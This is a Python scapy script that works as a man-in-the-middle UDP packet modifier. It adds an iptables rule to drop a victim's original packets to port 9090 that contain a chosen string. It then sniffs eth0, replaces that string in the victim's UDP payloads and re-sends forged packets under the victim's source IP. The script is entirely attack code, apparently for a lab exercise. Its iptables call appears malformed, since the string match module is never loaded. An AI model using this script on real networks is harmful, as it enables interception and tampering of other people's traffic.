#!/usr/bin/env python3
import argparse
from scapy.all import *
import subprocess

# --- Argument Parsing ---
parser = argparse.ArgumentParser(description="MITM Packet Modifier for UDP")
parser.add_argument("-s", "--src", required=True, help="Source IP address to filter")
parser.add_argument("-f", "--find", required=True, help="Pattern to find in payload")
parser.add_argument("-r", "--replace", required=True, help="Pattern to replace it with")
args = parser.parse_args()

# --- Add iptables DROP rule for original victim packet ---
iptables_cmd = [
    "iptables",
    "-A", "FORWARD",
    "-s", args.src,
    "-p", "udp",  # <-- UDP protocol now
    "--dport", "9090",
    "--string", args.find,
    "-j", "DROP"
]

try:
    subprocess.run(iptables_cmd, check=True)
    print(f"[+] iptables rule added to drop original packets containing: {args.find}")
except subprocess.CalledProcessError as e:
    print(f"[!] Failed to add iptables rule: {e}")

# --- Setup payload replacement ---
FIND = args.find.encode()
REPLACE = args.replace.encode()
SRC_IP = args.src

# We don't need to keep the same length with UDP, so we can safely skip the check.
print("[*] MITM Packet Modifier Running on UDP...")
print(f"    Filtering packets from {SRC_IP}")
print(f"    Replacing: {FIND} -> {REPLACE}")

# --- Packet Interception and Modification ---
def spoof_pkt(pkt):
    if pkt.haslayer(IP) and pkt.haslayer(UDP) and pkt[IP].src == SRC_IP:
        if pkt[UDP].payload:
            data = bytes(pkt[UDP].payload)
            print(f"[>] Raw data: {repr(data)}")

            if FIND in data:
                print(f"[+] Match found. Replacing data...")
                newdata = data.replace(FIND, REPLACE)

                # Rebuild and send packet
                newpkt = IP(dst=pkt[IP].dst, src=pkt[IP].src) / \
                         UDP(dport=pkt[UDP].dport, sport=pkt[UDP].sport) / \
                         newdata
                send(newpkt)
                print("[+] Modified and sent new UDP packet\n")
            else:
                print("[-] No target string found.\n")
        else:
            print("[-] UDP packet has no payload.\n")
    else:
        pass

# --- Start sniffing UDP packets ---
sniff(iface="eth0", filter="udp", prn=spoof_pkt)
